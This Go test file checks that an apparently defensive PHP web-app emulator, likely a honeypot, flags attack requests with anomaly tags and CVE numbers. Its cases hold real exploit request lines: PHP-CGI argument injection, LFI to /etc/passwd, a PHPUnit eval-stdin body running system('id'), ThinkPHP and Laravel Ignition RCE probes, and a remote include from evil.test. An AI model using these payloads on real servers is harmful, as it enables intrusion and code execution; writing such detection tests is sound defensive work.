package handler

import "testing"

func phpAnoms(line string, body []byte) ([]string, []string) {
	res := Result{Meta: map[string]any{}}
	_ = serveWebapp(line, body, "nginx", nil, &res)
	anoms, _ := res.Meta["anomalies"].([]string)
	return anoms, res.CVEHits
}

func TestPHPVulnEmulation(t *testing.T) {
	cases := []struct {
		name, line string
		body       []byte
		want       string
	}{
		{"php-filter", "GET /download.php?file=php://filter/convert.base64-encode/resource=config.php HTTP/1.1", nil, "webapp:php-filter-wrapper"},
		{"php-input", "GET /index.php?page=php://input HTTP/1.1", nil, "webapp:php-wrapper-rce"},
		{"phar", "GET /download.php?file=phar://uploads/evil.phar/x HTTP/1.1", nil, "webapp:php-phar-deserialize"},
		{"log-poison", "GET /download.php?file=/proc/self/environ HTTP/1.1", nil, "webapp:lfi-log-poison"},
		{"source-backup", "GET /config.inc.php.bak HTTP/1.1", nil, "webapp:php-source-disclosure"},
		{"eval-stdin", "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", []byte("<?php system('id'); ?>"), "webapp:php-eval-stdin"},
		{"php-cgi-2012", "GET /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp://input HTTP/1.1", nil, "webapp:php-cgi-arg-injection"},
	}
	for _, c := range cases {
		anoms, _ := phpAnoms(c.line, c.body)
		if !containsStr(anoms, c.want) {
			t.Errorf("%s: expected %q; anomalies=%v", c.name, c.want, anoms)
		}
	}
}

func TestPHPCGICVEMapping(t *testing.T) {
	// Classic CVE-2012-1823.
	_, cves := phpAnoms("GET /index.php?-dallow_url_include=1 HTTP/1.1", nil)
	if !containsStr(cves, "CVE-2012-1823") {
		t.Errorf("CVE-2012-1823 not flagged; cves=%v", cves)
	}
	// Windows best-fit soft-hyphen variant CVE-2024-4577.
	_, cves = phpAnoms("GET /index.php?%ADd+allow_url_include%3D1 HTTP/1.1", nil)
	if !containsStr(cves, "CVE-2024-4577") {
		t.Errorf("CVE-2024-4577 not flagged; cves=%v", cves)
	}
	// PHPUnit eval-stdin RCE.
	_, cves = phpAnoms("POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", []byte("<?php phpinfo();"))
	if !containsStr(cves, "CVE-2017-9841") {
		t.Errorf("CVE-2017-9841 not flagged; cves=%v", cves)
	}
}

func TestPHPVulnEmulationMore(t *testing.T) {
	cases := []struct {
		name, line string
		body       []byte
		want       string
	}{
		{"phpmyadmin-lfi", "GET /phpmyadmin/index.php?target=db_sql.php%253f/../../../../etc/passwd HTTP/1.1", nil, "webapp:phpmyadmin-lfi"},
		{"phpmyadmin-setup", "GET /phpmyadmin/scripts/setup.php HTTP/1.1", nil, "webapp:phpmyadmin-setup-rce"},
		{"adminer", "GET /adminer.php HTTP/1.1", nil, "webapp:adminer-exposed"},
		{"laravel-ignition", "POST /_ignition/execute-solution HTTP/1.1", []byte("{}"), "webapp:laravel-ignition-rce"},
		{"thinkphp", "GET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo HTTP/1.1", nil, "webapp:thinkphp-rce"},
		{"phpfpm-status", "GET /status HTTP/1.1", nil, "webapp:phpfpm-status"},
		{"composer", "GET /composer.lock HTTP/1.1", nil, "webapp:composer-manifest-leak"},
		{"php-cgi-exposed", "GET /cgi-bin/php-cgi HTTP/1.1", nil, "webapp:php-cgi-exposed"},
		{"webshell", "GET /wso.php HTTP/1.1", nil, "webapp:webshell-probe"},
		{"wp-user-enum", "GET /wp-json/wp/v2/users HTTP/1.1", nil, "webapp:wordpress-user-enum"},
		{"xmlrpc-brute", "POST /xmlrpc.php HTTP/1.1", []byte("<methodCall><methodName>system.multicall</methodName></methodCall>"), "webapp:wordpress-xmlrpc-brute"},
		{"superglobal", "GET /index.php?GLOBALS[x]=1 HTTP/1.1", nil, "webapp:php-superglobal-pollution"},
		{"type-juggle", "POST /login.php HTTP/1.1", []byte("password[]=x"), "webapp:php-type-juggling"},
		{"php-rfi", "GET /index.php?page=http://evil.test/shell.txt HTTP/1.1", nil, "webapp:php-rfi"},
		{"code-eval", "GET /x.php?f=assert(phpinfo()) HTTP/1.1", nil, "webapp:php-code-eval"},
	}
	for _, c := range cases {
		anoms, _ := phpAnoms(c.line, c.body)
		if !containsStr(anoms, c.want) {
			t.Errorf("%s: expected %q; anomalies=%v", c.name, c.want, anoms)
		}
	}
}

func TestPHPMoreCVEMapping(t *testing.T) {
	for _, c := range []struct{ line, body, cve string }{
		{"GET /phpmyadmin/index.php?target=x%253f/../etc/passwd HTTP/1.1", "", "CVE-2018-12613"},
		{"GET /phpmyadmin/scripts/setup.php HTTP/1.1", "", "CVE-2009-1151"},
		{"GET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array HTTP/1.1", "", "CVE-2018-20062"},
		{"POST /_ignition/execute-solution HTTP/1.1", "{}", "CVE-2021-3129"},
	} {
		_, cves := phpAnoms(c.line, []byte(c.body))
		if !containsStr(cves, c.cve) {
			t.Errorf("%s: expected %s; cves=%v", c.line, c.cve, cves)
		}
	}
}
